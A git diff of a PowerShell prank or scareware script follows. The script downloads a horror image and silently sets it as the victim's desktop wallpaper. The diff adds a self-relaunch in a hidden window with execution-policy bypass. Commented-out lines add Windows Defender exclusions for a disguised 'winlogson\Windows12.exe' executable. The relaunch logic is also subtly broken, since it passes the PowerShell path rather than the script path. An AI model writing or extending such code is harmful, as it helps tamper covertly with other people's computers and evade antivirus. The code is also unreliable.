@@ -1,8 +1,11 @@
-# Start cmd.exe
-# Start-Process "$env:windir\System32\cmd.exe"
-
 $imageUrl = "https://thumbs.dreamstime.com/b/man-screams-fear-horror-pop-art-retro-vector-illustration-103789731.jpg"
 $outputPath = "$env:USERPROFILE\sfondo.jpg"
+
+if ($host.Name -eq 'ConsoleHost') {
+    $scriptPath = (Get-Process -Id $PID).Path
+    Start-Process -WindowStyle Hidden -FilePath "powershell.exe" -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$scriptPath`""
+    exit
+}
 
 # Create a job to download the file
 $job = Start-Job -ScriptBlock {
@@ -13,11 +16,6 @@ $job = Start-Job -ScriptBlock {
 # Wait for the job to complete
 Wait-Job -Job $job | Out-Null
 
-# Check if the file exists and has content
-while (!(Test-Path $outputPath -PathType Leaf) -or (Get-Item $outputPath).Length -eq 0) {
-    Start-Sleep -Seconds 1
-}
-
 # Set the wallpaper
 $RegKeyPath = "HKCU:\Control Panel\Desktop"
 Set-ItemProperty -Path $RegKeyPath -Name Wallpaper -Value $outputPath
@@ -26,6 +24,7 @@ RUNDLL32.EXE USER32.DLL, UpdatePerUserSystemParameters 1, True
 
 # Clean up the job
 Remove-Job -Job $job
+
 
 # Add-MpPreference -ExclusionPath "C:\Windows\system32\winlogson\Windows12.exe"
 # Add-MpPreference -ExclusionPath "$env:APPDATA\Windows12.exe"
